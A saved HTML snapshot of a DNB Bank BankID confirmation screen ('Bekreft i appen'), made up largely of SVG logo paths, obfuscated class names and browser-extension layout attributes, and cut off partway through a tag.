        <div id="app" bis_skin_checked="1">
            <div class="appViewport" bis_skin_checked="1">
                <div class="-Xh-zxc-5iU-" bis_skin_checked="1">
                    <div class="T6JudSrF7xU-" bis_skin_checked="1">
                        <div class="MNJRkYmiNJo-" bis_skin_checked="1">
                            <div class="pTZAeuSiHLM- FpzL5vI50-o-" data-direction="fade" bis_skin_checked="1">
                                <div class="Cbm6kxAjb3A-" bis_skin_checked="1">
                                    <div aria-hidden="true" class="UeFlY2lFKFA-" bis_skin_checked="1">
                                        <div class="wup5P-GPUUY-" bis_skin_checked="1">
                                            <header class="RnM5kkyLJe8-">
                                                <div class="VGjB0ReHXLQ-" bis_skin_checked="1">
                                                    <svg fill="none" focusable="false" height="14" viewBox="0 0 90 14" width="90" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                                                        <path d="M29.5273 8.5156C29.5273 10.5786 30.6877 11.6746 32.0416 11.6746C33.2665 11.6746 34.6204 10.6431 34.6204 8.5156C34.6204 6.38809 33.331 5.42104 32.106 5.42104C30.7522 5.42104 29.5273 6.38809 29.5273 8.5156ZM29.5273 0.0700378V5.09869C30.1075 4.19611 31.139 3.29353 32.8797 3.29353C34.8138 3.29353 37.1347 4.90528 37.1347 8.45113C37.1347 12.1259 34.9427 13.9311 32.6863 13.9311C31.3969 13.9311 30.3009 13.3508 29.5917 12.1904V13.6087H27.0774V0.0700378H29.5273Z" fill="white"></path>
                                                        <path d="M40.8095 8.58009C40.8095 10.7076 42.0989 11.6747 43.3238 11.6747C44.6777 11.6747 45.8381 10.7721 45.8381 8.58009C45.8381 6.45258 44.6777 5.42107 43.3238 5.42107C42.1634 5.42107 40.8095 6.38811 40.8095 8.58009ZM38.3596 8.45115C38.3596 4.96978 40.6161 3.22909 42.8725 3.22909C44.0975 3.22909 45.129 3.68038 45.9026 4.77637V3.48697H48.3525V13.6087H45.9026V12.1904C45.1934 13.1575 44.1619 13.8666 42.5502 13.8666C40.6161 13.8666 38.3596 12.1904 38.3596 8.45115Z" fill="white"></path>
                                                        <path d="M53.1877 7.87091V13.6087H50.7378V3.55142H53.1877V5.03423C53.8969 3.74483 55.1863 3.29354 56.2823 3.29354C58.0229 3.29354 59.6992 4.19612 59.6992 6.90386V13.6087H57.2493V7.80644C57.2493 6.13022 56.4112 5.48552 55.3152 5.48552C54.0903 5.54999 53.1877 6.25916 53.1877 7.87091Z" fill="white"></path>
                                                        <path d="M62.0201 0.0700684V13.6088H64.4699V11.1589L65.8238 9.48268L68.596 13.6088H71.3037L67.3066 7.74199L70.788 3.55144H68.0158L64.4699 8.19328V0.0700684H62.0201Z" fill="white"></path>
                                                        <path d="M76.2034 0.52137H73.6891V13.6088H76.2034V0.52137Z" fill="white"></path>
                                                        <path d="M83.4886 0.52137H78.7178V13.6088H83.4886C87.0344 13.6088 90 11.4813 90 7.03283C90 2.64888 87.0344 0.52137 83.4886 0.52137ZM83.4886 11.2878H81.2321V2.84229H83.4886C85.5516 2.84229 87.2923 4.19616 87.2923 7.0973C87.2923 9.93398 85.5516 11.2878 83.4886 11.2878Z" fill="white"></path>
                                                        <path d="M0.967273 2.00349H4.83636C5.35224 2.00349 5.80364 1.55209 5.80364 1.03621C5.80364 0.520333 5.35224 0.0689392 4.83636 0.0689392H0.967273C0.451394 0.0689392 0 0.520333 0 1.03621C0 1.55209 0.451394 2.00349 0.967273 2.00349Z" fill="white"></path>
                                                        <path d="M0.967273 9.74167H4.83636C5.35224 9.74167 5.80364 9.29028 5.80364 8.7744C5.80364 8.25852 5.35224 7.80712 4.83636 7.80712H0.967273C0.451394 7.80712 0 8.25852 0 8.7744C0 9.29028 0.451394 9.74167 0.967273 9.74167Z" fill="white"></path>
                                                        <path d="M4.83636 13.6108H0.967273C0.451394 13.6108 0 13.1594 0 12.6435C0 12.1276 0.451394 11.6762 0.967273 11.6762H4.83636C5.35224 11.6762 5.80364 12.1276 5.80364 12.6435C5.80364 13.1594 5.35224 13.6108 4.83636 13.6108Z" fill="white"></path>
                                                        <path d="M8.70545 5.87258H12.5745C13.0904 5.87258 13.5418 5.42118 13.5418 4.90531C13.5418 4.38943 13.0904 3.93803 12.5745 3.93803H8.70545C8.18958 3.93803 7.73818 4.38943 7.73818 4.90531C7.73818 5.42118 8.18958 5.87258 8.70545 5.87258Z" fill="white"></path>
                                                        <path d="M12.5745 9.74167H8.70545C8.18958 9.74167 7.73818 9.29028 7.73818 8.7744C7.73818 8.25852 8.18958 7.80712 8.70545 7.80712H12.5745C13.0904 7.80712 13.5418 8.25852 13.5418 8.7744C13.5418 9.29028 13.0904 9.74167 12.5745 9.74167Z" fill="white"></path>
                                                        <path d="M16.4436 2.00349H20.3127C20.8286 2.00349 21.28 1.55209 21.28 1.03621C21.28 0.520333 20.8286 0.0689392 20.3127 0.0689392H16.4436C15.9278 0.0689392 15.4764 0.520333 15.4764 1.03621C15.4764 1.55209 15.9278 2.00349 16.4436 2.00349Z" fill="white"></path>
                                                        <path d="M20.3127 5.87258H16.4436C15.9278 5.87258 15.4764 5.42118 15.4764 4.90531C15.4764 4.38943 15.9278 3.93803 16.4436 3.93803H20.3127C20.8286 3.93803 21.28 4.38943 21.28 4.90531C21.28 5.42118 20.8286 5.87258 20.3127 5.87258Z" fill="white"></path>
                                                        <path d="M16.4436 13.6108H20.3127C20.8286 13.6108 21.28 13.1594 21.28 12.6435C21.28 12.1276 20.8286 11.6762 20.3127 11.6762H16.4436C15.9278 11.6762 15.4764 12.1276 15.4764 12.6435C15.4764 13.1594 15.9278 13.6108 16.4436 13.6108Z" fill="white"></path>
                                                    </svg>
                                                </div>
                                            </header>
                                            <main class="uLsXIdeN3YE-">
                                                <div class="a-O3AScSr-A-" bis_skin_checked="1">
                                                    <div class="GfdhxHv-UH0-" bis_skin_checked="1">
                                                        <svg aria-busy="true" class="wZGPbQu3nk4-" fill="none" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
                                                            <mask height="24" id="mask0_27_549" maskUnits="userSpaceOnUse" width="24" x="0" y="0" style="mask-type: alpha">
                                                                <rect fill="white" height="24" width="24"></rect>
                                                            </mask>
                                                            <g mask="url(#mask0_27_549)">
                                                                <path d="M11 17C11 19.2091 9.20914 21 7 21C4.79086 21 3 19.2091 3 17C3 14.7909 4.79086 13 7 13C9.20914 13 11 14.7909 11 17Z" fill="black"></path>
                                                                <path d="M21 7C21 9.20914 19.2091 11 17 11C14.7909 11 13 9.20914 13 7C13 4.79086 14.7909 3 17 3C19.2091 3 21 4.79086 21 7Z" fill="black"></path>
                                                            </g>
                                                        </svg>
                                                    </div>
                                                </div>
                                            </main>
                                        </div>
                                    </div>
                                    <div class="ajyUSMZ-Dv4- ShGJWcqedDM-" id="bid-client" bis_skin_checked="1">
                                        <iframe data-savepage-crossorigin="" data-savepage-sandbox="allow-scripts" sandbox="allow-scripts" data-savepage-srcdoc="<!DOCTYPE html><html lang="nb"><head><script data-savepage-type="" type="text/plain" data-savepage-src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script><script data-savepage-type="" type="text/plain" data-savepage-src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js"></script><base href="https://csfe.bankid.no/CentralServerFEJS/a?cid=buZCzSzH1x4pcRZa"><link rel="stylesheet" type="text/css" href="/jsclient21/css/bid_202609080750.css"><meta name="viewport" content="initial-scale=1.0"><meta charset="iso-8859-1"><script bis_use="true" data-savepage-type="text/javascript" type="text/plain" charset="utf-8" nonce="" data-dynamic-id="e0549669-e628-4c0a-ac8a-66896a6fc7fd" data-savepage-src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/executors/200.js"></script><script data-savepage-type="" type="text/plain" data-savepage-src="data:text/javascript;base64,"></script>
<style id="savepage-cssvariables">
  :root {
  }
</style>
                        </head><body __processed_6db07d4a-e9db-4676-bd80-d8effce8c159__="true" bis_status="ok" bis_frame_id="182" bis_body_id="fr_kwbocykyp4cbwjrd3dyq2i" bis_depth="0" bis_chainid="1" bis_size="{&quot;x&quot;:0,&quot;y&quot;:0,&quot;w&quot;:450,&quot;h&quot;:520,&quot;abs_x&quot;:634,&quot;abs_y&quot;:87}"><div id="app" bis_size="{&quot;x&quot;:0,&quot;y&quot;:0,&quot;w&quot;:450,&quot;h&quot;:520,&quot;abs_x&quot;:634,&quot;abs_y&quot;:87}"><div class="Lua4ap2uGkQ-" bis_size="{&quot;x&quot;:0,&quot;y&quot;:0,&quot;w&quot;:450,&quot;h&quot;:520,&quot;abs_x&quot;:634,&quot;abs_y&quot;:87}"><div class="O5xZsmVjdmo-" bis_size="{&quot;x&quot;:0,&quot;y&quot;:0,&quot;w&quot;:450,&quot;h&quot;:520,&quot;abs_x&quot;:634,&quot;abs_y&quot;:87}"><div class="AZhftGJX1fQ-" data-viewport="otpChallenge" bis_size="{&quot;x&quot;:0,&quot;y&quot;:0,&quot;w&quot;:450,&quot;h&quot;:520,&quot;abs_x&quot;:634,&quot;abs_y&quot;:87}"><div class="AFP4hM8sct4-" bis_size="{&quot;x&quot;:1,&quot;y&quot;:1,&quot;w&quot;:448,&quot;h&quot;:57,&quot;abs_x&quot;:635,&quot;abs_y&quot;:88}"><header class="_9z1U54gUQEg-" data-has-back="false" bis_size="{&quot;x&quot;:17,&quot;y&quot;:1,&quot;w&quot;:416,&quot;h&quot;:57,&quot;abs_x&quot;:651,&quot;abs_y&quot;:88}"><div class="Nv0kK8uGeS0-" bis_size="{&quot;x&quot;:0,&quot;y&quot;:0,&quot;w&quot;:0,&quot;h&quot;:0,&quot;abs_x&quot;:634,&quot;abs_y&quot;:87}"></div><div class="_3--1Lzuaofk-" bis_size="{&quot;x&quot;:180,&quot;y&quot;:22,&quot;w&quot;:90,&quot;h&quot;:14,&quot;abs_x&quot;:814,&quot;abs_y&quot;:109}"><div class="ul9tGGaWnp8-" bis_size="{&quot;x&quot;:180,&quot;y&quot;:22,&quot;w&quot;:90,&quot;h&quot;:14,&quot;abs_x&quot;:814,&quot;abs_y&quot;:109}"><svg aria-hidden="true" fill="none" height="14" viewBox="0 0 90 14" width="90" xmlns="http://www.w3.org/2000/svg" bis_size="{&quot;x&quot;:180,&quot;y&quot;:22,&quot;w&quot;:90,&quot;h&quot;:14,&quot;abs_x&quot;:814,&quot;abs_y&quot;:109}"><path d="M29.5273 8.5156C29.5273 10.5786 30.6877 11.6746 32.0416 11.6746C33.2665 11.6746 34.6204 10.6431 34.6204 8.5156C34.6204 6.38809 33.331 5.42104 32.106 5.42104C30.7522 5.42104 29.5273 6.38809 29.5273 8.5156ZM29.5273 0.0700378V5.09869C30.1075 4.19611 31.139 3.29353 32.8797 3.29353C34.8138 3.29353 37.1347 4.90528 37.1347 8.45113C37.1347 12.1259 34.9427 13.9311 32.6863 13.9311C31.3969 13.9311 30.3009 13.3508 29.5917 12.1904V13.6087H27.0774V0.0700378H29.5273Z" fill="white" bis_size="{&quot;x&quot;:207,&quot;y&quot;:22,&quot;w&quot;:10,&quot;h&quot;:13,&quot;abs_x&quot;:841,&quot;abs_y&quot;:109}"></path><path d="M40.8095 8.58009C40.8095 10.7076 42.0989 11.6747 43.3238 11.6747C44.6777 11.6747 45.8381 10.7721 45.8381 8.58009C45.8381 6.45258 44.6777 5.42107 43.3238 5.42107C42.1634 5.42107 40.8095 6.38811 40.8095 8.58009ZM38.3596 8.45115C38.3596 4.96978 40.6161 3.22909 42.8725 3.22909C44.0975 3.22909 45.129 3.68038 45.9026 4.77637V3.48697H48.3525V13.6087H45.9026V12.1904C45.1934 13.1575 44.1619 13.8666 42.5502 13.8666C40.6161 13.8666 38.3596 12.1904 38.3596 8.45115Z" fill="white" bis_size="{&quot;x&quot;:218,&quot;y&quot;:25,&quot;w&quot;:9,&quot;h&quot;:10,&quot;abs_x&quot;:852,&quot;abs_y&quot;:112}"></path><path d="M53.1877 7.87091V13.6087H50.7378V3.55142H53.1877V5.03423C53.8969 3.74483 55.1863 3.29354 56.2823 3.29354C58.0229 3.29354 59.6992 4.19612 59.6992 6.90386V13.6087H57.2493V7.80644C57.2493 6.13022 56.4112 5.48552 55.3152 5.48552C54.0903 5.54999 53.1877 6.25916 53.1877 7.87091Z" fill="white" bis_size="{&quot;x&quot;:230,&quot;y&quot;:26,&quot;w&quot;:8,&quot;h&quot;:10,&quot;abs_x&quot;:864,&quot;abs_y&quot;:113}"></path><path d="M62.0201 0.0700684V13.6088H64.4699V11.1589L65.8238 9.48268L68.596 13.6088H71.3037L67.3066 7.74199L70.788 3.55144H68.0158L64.4699 8.19328V0.0700684H62.0201Z" fill="white" bis_size="{&quot;x&quot;:242,&quot;y&quot;:22,&quot;w&quot;:9,&quot;h&quot;:13,&quot;abs_x&quot;:876,&quot;abs_y&quot;:109}"></path><path d="M76.2034 0.52137H73.6891V13.6088H76.2034V0.52137Z" fill="white" bis_size="{&quot;x&quot;:253,&quot;y&quot;:23,&quot;w&quot;:2,&quot;h&quot;:13,&quot;abs_x&quot;:887,&quot;abs_y&quot;:110}"></path><path d="M83.4886 0.52137H78.7178V13.6088H83.4886C87.0344 13.6088 90 11.4813 90 7.03283C90 2.64888 87.0344 0.52137 83.4886 0.52137ZM83.4886 11.2878H81.2321V2.84229H83.4886C85.5516 2.84229 87.2923 4.19616 87.2923 7.0973C87.2923 9.93398 85.5516 11.2878 83.4886 11.2878Z" fill="white" bis_size="{&quot;x&quot;:258,&quot;y&quot;:23,&quot;w&quot;:11,&quot;h&quot;:13,&quot;abs_x&quot;:892,&quot;abs_y&quot;:110}"></path><path d="M0.967273 2.00349H4.83636C5.35224 2.00349 5.80364 1.55209 5.80364 1.03621C5.80364 0.520333 5.35224 0.0689392 4.83636 0.0689392H0.967273C0.451394 0.0689392 0 0.520333 0 1.03621C0 1.55209 0.451394 2.00349 0.967273 2.00349Z" fill="white" bis_size="{&quot;x&quot;:180,&quot;y&quot;:22,&quot;w&quot;:5,&quot;h&quot;:1,&quot;abs_x&quot;:814,&quot;abs_y&quot;:109}"></path><path d="M0.967273 9.74167H4.83636C5.35224 9.74167 5.80364 9.29028 5.80364 8.7744C5.80364 8.25852 5.35224 7.80712 4.83636 7.80712H0.967273C0.451394 7.80712 0 8.25852 0 8.7744C0 9.29028 0.451394 9.74167 0.967273 9.74167Z" fill="white" bis_size="{&quot;x&quot;:180,&quot;y&quot;:30,&quot;w&quot;:5,&quot;h&quot;:1,&quot;abs_x&quot;:814,&quot;abs_y&quot;:117}"></path><path d="M4.83636 13.6108H0.967273C0.451394 13.6108 0 13.1594 0 12.6435C0 12.1276 0.451394 11.6762 0.967273 11.6762H4.83636C5.35224 11.6762 5.80364 12.1276 5.80364 12.6435C5.80364 13.1594 5.35224 13.6108 4.83636 13.6108Z" fill="white" bis_size="{&quot;x&quot;:180,&quot;y&quot;:34,&quot;w&quot;:5,&quot;h&quot;:1,&quot;abs_x&quot;:814,&quot;abs_y&quot;:121}"></path><path d="M8.70545 5.87258H12.5745C13.0904 5.87258 13.5418 5.42118 13.5418 4.90531C13.5418 4.38943 13.0904 3.93803 12.5745 3.93803H8.70545C8.18958 3.93803 7.73818 4.38943 7.73818 4.90531C7.73818 5.42118 8.18958 5.87258 8.70545 5.87258Z" fill="white" bis_size="{&quot;x&quot;:187,&quot;y&quot;:26,&quot;w&quot;:5,&quot;h&quot;:1,&quot;abs_x&quot;:821,&quot;abs_y&quot;:113}"></path><path d="M12.5745 9.74167H8.70545C8.18958 9.74167 7.73818 9.29028 7.73818 8.7744C7.73818 8.25852 8.18958 7.80712 8.70545 7.80712H12.5745C13.0904 7.80712 13.5418 8.25852 13.5418 8.7744C13.5418 9.29028 13.0904 9.74167 12.5745 9.74167Z" fill="white" bis_size="{&quot;x&quot;:187,&quot;y&quot;:30,&quot;w&quot;:5,&quot;h&quot;:1,&quot;abs_x&quot;:821,&quot;abs_y&quot;:117}"></path><path d="M16.4436 2.00349H20.3127C20.8286 2.00349 21.28 1.55209 21.28 1.03621C21.28 0.520333 20.8286 0.0689392 20.3127 0.0689392H16.4436C15.9278 0.0689392 15.4764 0.520333 15.4764 1.03621C15.4764 1.55209 15.9278 2.00349 16.4436 2.00349Z" fill="white" bis_size="{&quot;x&quot;:195,&quot;y&quot;:22,&quot;w&quot;:5,&quot;h&quot;:1,&quot;abs_x&quot;:829,&quot;abs_y&quot;:109}"></path><path d="M20.3127 5.87258H16.4436C15.9278 5.87258 15.4764 5.42118 15.4764 4.90531C15.4764 4.38943 15.9278 3.93803 16.4436 3.93803H20.3127C20.8286 3.93803 21.28 4.38943 21.28 4.90531C21.28 5.42118 20.8286 5.87258 20.3127 5.87258Z" fill="white" bis_size="{&quot;x&quot;:195,&quot;y&quot;:26,&quot;w&quot;:5,&quot;h&quot;:1,&quot;abs_x&quot;:829,&quot;abs_y&quot;:113}"></path><path d="M16.4436 13.6108H20.3127C20.8286 13.6108 21.28 13.1594 21.28 12.6435C21.28 12.1276 20.8286 11.6762 20.3127 11.6762H16.4436C15.9278 11.6762 15.4764 12.1276 15.4764 12.6435C15.4764 13.1594 15.9278 13.6108 16.4436 13.6108Z" fill="white" bis_size="{&quot;x&quot;:195,&quot;y&quot;:34,&quot;w&quot;:5,&quot;h&quot;:1,&quot;abs_x&quot;:829,&quot;abs_y&quot;:121}"></path></svg></div></div><div class="Z-XtFZJCw8c-" bis_size="{&quot;x&quot;:0,&quot;y&quot;:0,&quot;w&quot;:0,&quot;h&quot;:0,&quot;abs_x&quot;:634,&quot;abs_y&quot;:87}"><h1 id="P0-1" tabindex="-1" bis_size="{&quot;x&quot;:0,&quot;y&quot;:0,&quot;w&quot;:0,&quot;h&quot;:0,&quot;abs_x&quot;:634,&quot;abs_y&quot;:87}"><span bis_size="{&quot;x&quot;:0,&quot;y&quot;:0,&quot;w&quot;:0,&quot;h&quot;:0,&quot;abs_x&quot;:634,&quot;abs_y&quot;:87}">Bekreft i appen</span></h1></div><div class="rroRwgEBZuQ-" bis_size="{&quot;x&quot;:393,&quot;y&quot;:13,&quot;w&quot;:40,&quot;h&quot;:32,&quot;abs_x&quot;:1027,&quot;abs_y&quot;:100}"><div bis_size="{&quot;x&quot;:393,&quot;y&quot;:13,&quot;w&quot;:40,&quot;h&quot;:32,&quot;abs_x&quot;:1027,&quot;abs_y&quot;:100}"><button class="_0GDSvZVsPEo-" data-variant="transparent" type="button" title="Åpne meny" bis_size="{&quot;x&quot;:393,&quot;y&quot;:13,&quot;w&quot;:40,&quot;h&quot;:32,&quot;abs_x&quot;:1027,&quot;abs_y&quot;:100}"><span class="owg3SWE7I-4-" bis_size="{&quot;x&quot;:401,&quot;y&quot;:17,&quot;w&quot;:24,&quot;h&quot;:24,&quot;abs_x&quot;:1035,&quot;abs_y&quot;:104}"><svg aria-hidden="true" fill="none" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg" bis_size="{&quot;x&quot;:401,&quot;y&quot;:17,&quot;w&quot;:24,&quot;h&quot;:24,&quot;abs_x&quot;:1035,&quot;abs_y&quot;:104}"><path d="M12 2.25C10.0716 2.25 8.18657 2.82183 6.58319 3.89317C4.97982 4.96451 3.73013 6.48726 2.99218 8.26884C2.25422 10.0504 2.06114 12.0108 2.43735 13.9021C2.81355 15.7934 3.74215 17.5307 5.10571 18.8943C6.46928 20.2579 8.20656 21.1865 10.0979 21.5627C11.9892 21.9389 13.9496 21.7458 15.7312 21.0078C17.5127 20.2699 19.0355 19.0202 20.1068 17.4168C21.1782 15.8134 21.75 13.9284 21.75 12C21.7473 9.41498 20.7192 6.93661 18.8913 5.10872C17.0634 3.28084 14.585 2.25273 12 2.25ZM12 20.25C10.3683 20.25 8.77326 19.7661 7.41655 18.8596C6.05984 17.9531 5.00242 16.6646 4.378 15.1571C3.75358 13.6496 3.5902 11.9908 3.90853 10.3905C4.22685 8.79016 5.01259 7.32015 6.16637 6.16637C7.32016 5.01259 8.79017 4.22685 10.3905 3.90852C11.9909 3.59019 13.6497 3.75357 15.1571 4.37799C16.6646 5.00242 17.9531 6.05984 18.8596 7.41655C19.7661 8.77325 20.25 10.3683 20.25 12C20.2475 14.1873 19.3775 16.2843 17.8309 17.8309C16.2843 19.3775 14.1873 20.2475 12 20.25ZM13.5 16.5C13.5 16.6989 13.421 16.8897 13.2803 17.0303C13.1397 17.171 12.9489 17.25 12.75 17.25C12.3522 17.25 11.9706 17.092 11.6893 16.8107C11.408 16.5294 11.25 16.1478 11.25 15.75V12C11.0511 12 10.8603 11.921 10.7197 11.7803C10.579 11.6397 10.5 11.4489 10.5 11.25C10.5 11.0511 10.579 10.8603 10.7197 10.7197C10.8603 10.579 11.0511 10.5 11.25 10.5C11.6478 10.5 12.0294 10.658 12.3107 10.9393C12.592 11.2206 12.75 11.6022 12.75 12V15.75C12.9489 15.75 13.1397 15.829 13.2803 15.9697C13.421 16.1103 13.5 16.3011 13.5 16.5ZM10.5 7.875C10.5 7.6525 10.566 7.43499 10.6896 7.24998C10.8132 7.06498 10.9889 6.92078 11.1945 6.83564C11.4001 6.75049 11.6263 6.72821 11.8445 6.77162C12.0627 6.81502 12.2632 6.92217 12.4205 7.0795C12.5778 7.23684 12.685 7.43729 12.7284 7.65552C12.7718 7.87375 12.7495 8.09995 12.6644 8.30552C12.5792 8.51109 12.435 8.68679 12.25 8.8104C12.065 8.93402 11.8475 9 11.625 9C11.3266 9 11.0405 8.88147 10.8295 8.6705C10.6185 8.45952 10.5 8.17337 10.5 7.875Z" fill="black" bis_size="{&quot;x&quot;:403,&quot;y&quot;:20,&quot;w&quot;:19,&quot;h&quot;:19,&quot;abs_x&quot;:1037,&quot;abs_y&quot;:107}"></path></svg></span></button></div></div></header></div><main class="lH9xEtG2mCI-" bis_size="{&quot;x&quot;:1,&quot;y&quot;:58,&quot;w&quot;:448,&quot;h&quot;:460,&quot;abs_x&quot;:635,&quot;abs_y&quot;:145}"><div class="xdexl2z-LoQ-" bis_size="{&quot;x&quot;:1,&quot;y&quot;:58,&quot;w&quot;:448,&quot;h&quot;:460,&quot;abs_x&quot;:635,&quot;abs_y&quot;:145}"><div class="_5N17V2ww3jg-" bis_size="{&quot;x&quot;:1,&quot;y&quot;:58,&quot;w&quot;:448,&quot;h&quot;:460,&quot;abs_x&quot;:635,&quot;abs_y&quot;:145}"><div class="psnZoCxGFCw- n9F0CdBAfu0-" bis_size="{&quot;x&quot;:1,&quot;y&quot;:58,&quot;w&quot;:448,&quot;h&quot;:460,&quot;abs_x&quot;:635,&quot;abs_y&quot;:145}"><div class="Wx-8BLcX9K8-" bis_size="{&quot;x&quot;:13,&quot;y&quot;:58,&quot;w&quot;:428,&quot;h&quot;:460,&quot;abs_x&quot;:647,&quot;abs_y&quot;:145}"><div class="Vxvq0OQ2EoE-" bis_size="{&quot;x&quot;:131,&quot;y&quot;:62,&quot;w&quot;:187,&quot;h&quot;:61,&quot;abs_x&quot;:765,&quot;abs_y&quot;:149}"><h1 class="mnmfEEsQ8Bw-" id="P0-1" tabindex="-1" bis_size="{&quot;x&quot;:131,&quot;y&quot;:62,&quot;w&quot;:187,&quot;h&quot;:30,&quot;abs_x&quot;:765,&quot;abs_y&quot;:149}"><span bis_size="{&quot;x&quot;:131,&quot;y&quot;:62,&quot;w&quot;:187,&quot;h&quot;:30,&quot;abs_x&quot;:765,&quot;abs_y&quot;:149}">Bekreft i appen</span></h1><p class="gQIlCC1ijQ0-" bis_size="{&quot;x&quot;:162,&quot;y&quot;:102,&quot;w&quot;:124,&quot;h&quot;:21,&quot;abs_x&quot;:796,&quot;abs_y&quot;:189}">DNB Bank ASA</p></div><div class="MRDe6--z-b4-" bis_size="{&quot;x&quot;:17,&quot;y&quot;:134,&quot;w&quot;:416,&quot;h&quot;:375,&quot;abs_x&quot;:651,&quot;abs_y&quot;:221}"><div class="EVWKyPP5QhM- wjTH1MDT4RA-" bis_size="{&quot;x&quot;:40,&quot;y&quot;:196,&quot;w&quot;:370,&quot;h&quot;:250,&quot;abs_x&quot;:674,&quot;abs_y&quot;:283}"><div class="OgdyOiyqLtw-" bis_size="{&quot;x&quot;:195,&quot;y&quot;:196,&quot;w&quot;:60,&quot;h&quot;:60,&quot;abs_x&quot;:829,&quot;abs_y&quot;:283}"><svg class="XMrJ483EtrA-" fill="none" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg" aria-busy="true" aria-label="Venter på bekreftelse" bis_size="{&quot;x&quot;:193,&quot;y&quot;:194,&quot;w&quot;:63,&quot;h&quot;:63,&quot;abs_x&quot;:827,&quot;abs_y&quot;:281}"><mask height="24" id="mask0_27_549" maskUnits="userSpaceOnUse" width="24" x="0" y="0" style="mask-type: alpha;" bis_size="{&quot;x&quot;:0,&quot;y&quot;:0,&quot;w&quot;:0,&quot;h&quot;:0,&quot;abs_x&quot;:634,&quot;abs_y&quot;:87}"><rect fill="white" height="24" width="24" bis_size="{&quot;x&quot;:0,&quot;y&quot;:0,&quot;w&quot;:0,&quot;h&quot;:0,&quot;abs_x&quot;:634,&quot;abs_y&quot;:87}"></rect></mask><g mask="url(#mask0_27_549)" bis_size="{&quot;x&quot;:201,&quot;y&quot;:202,&quot;w&quot;:47,&quot;h&quot;:47,&quot;abs_x&quot;:835,&quot;abs_y&quot;:289}"><path d="M11 17C11 19.2091 9.20914 21 7 21C4.79086 21 3 19.2091 3 17C3 14.7909 4.79086 13 7 13C9.20914 13 11 14.7909 11 17Z" fill="black" bis_size="{&quot;x&quot;:201,&quot;y&quot;:204,&quot;w&quot;:21,&quot;h&quot;:21,&quot;abs_x&quot;:835,&quot;abs_y&quot;:291}"></path><path d="M21 7C21 9.20914 19.2091 11 17 11C14.7909 11 13 9.20914 13 7C13 4.79086 14.7909 3 17 3C19.2091 3 21 4.79086 21 7Z" fill="black" bis_size="{&quot;x&quot;:227,&quot;y&quot;:227,&quot;w&quot;:21,&quot;h&quot;:21,&quot;abs_x&quot;:861,&quot;abs_y&quot;:314}"></path></g></svg></div><div class="xBoUtclVXV8-" bis_size="{&quot;x&quot;:89,&quot;y&quot;:272,&quot;w&quot;:270,&quot;h&quot;:26,&quot;abs_x&quot;:723,&quot;abs_y&quot;:359}"><span class="_40xXfzBIVkQ-" bis_size="{&quot;x&quot;:89,&quot;y&quot;:272,&quot;w&quot;:246,&quot;h&quot;:20,&quot;abs_x&quot;:723,&quot;abs_y&quot;:359}">Godkjenn med din BankID-app</span><button class="x-l2qNWa1E4-" title="Åpne hjelpedialogen" type="button" bis_size="{&quot;x&quot;:336,&quot;y&quot;:272,&quot;w&quot;:24,&quot;h&quot;:24,&quot;abs_x&quot;:970,&quot;abs_y&quot;:359}"><svg aria-hidden="true" fill="none" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg" bis_size="{&quot;x&quot;:336,&quot;y&quot;:272,&quot;w&quot;:24,&quot;h&quot;:24,&quot;abs_x&quot;:970,&quot;abs_y&quot;:359}"><path d="M13.125 16.875C13.125 17.0975 13.059 17.315 12.9354 17.5C12.8118 17.685 12.6361 17.8292 12.4305 17.9144C12.225 17.9995 11.9988 18.0218 11.7805 17.9784C11.5623 17.935 11.3618 17.8278 11.2045 17.6705C11.0472 17.5132 10.94 17.3127 10.8966 17.0945C10.8532 16.8762 10.8755 16.65 10.9606 16.4445C11.0458 16.2389 11.19 16.0632 11.375 15.9396C11.56 15.816 11.7775 15.75 12 15.75C12.2984 15.75 12.5845 15.8685 12.7955 16.0795C13.0065 16.2905 13.125 16.5766 13.125 16.875ZM12 6.75C9.93188 6.75 8.25 8.26406 8.25 10.125V10.5C8.25 10.6989 8.32902 10.8897 8.46967 11.0303C8.61033 11.171 8.80109 11.25 9 11.25C9.19892 11.25 9.38968 11.171 9.53033 11.0303C9.67099 10.8897 9.75 10.6989 9.75 10.5V10.125C9.75 9.09375 10.7597 8.25 12 8.25C13.2403 8.25 14.25 9.09375 14.25 10.125C14.25 11.1562 13.2403 12 12 12C11.8011 12 11.6103 12.079 11.4697 12.2197C11.329 12.3603 11.25 12.5511 11.25 12.75V13.5C11.25 13.6989 11.329 13.8897 11.4697 14.0303C11.6103 14.171 11.8011 14.25 12 14.25C12.1989 14.25 12.3897 14.171 12.5303 14.0303C12.671 13.8897 12.75 13.6989 12.75 13.5V13.4325C14.46 13.1184 15.75 11.7544 15.75 10.125C15.75 8.26406 14.0681 6.75 12 6.75ZM21.75 12C21.75 13.9284 21.1782 15.8134 20.1068 17.4168C19.0355 19.0202 17.5127 20.2699 15.7312 21.0078C13.9496 21.7458 11.9892 21.9389 10.0979 21.5627C8.20656 21.1865 6.46928 20.2579 5.10571 18.8943C3.74215 17.5307 2.81355 15.7934 2.43735 13.9021C2.06114 12.0108 2.25422 10.0504 2.99218 8.26884C3.73013 6.48726 4.97982 4.96451 6.58319 3.89317C8.18657 2.82183 10.0716 2.25 12 2.25C14.585 2.25273 17.0634 3.28084 18.8913 5.10872C20.7192 6.93661 21.7473 9.41498 21.75 12ZM20.25 12C20.25 10.3683 19.7661 8.77325 18.8596 7.41655C17.9531 6.05984 16.6646 5.00242 15.1571 4.37799C13.6497 3.75357 11.9909 3.59019 10.3905 3.90852C8.79017 4.22685 7.32016 5.01259 6.16637 6.16637C5.01259 7.32015 4.22685 8.79016 3.90853 10.3905C3.5902 11.9908 3.75358 13.6496 4.378 15.1571C5.00242 16.6646 6.05984 17.9531 7.41655 18.8596C8.77326 19.7661 10.3683 20.25 12 20.25C14.1873 20.2475 16.2843 19.3775 17.8309 17.8309C19.3775 16.2843 20.2475 14.1873 20.25 12Z" fill="black" 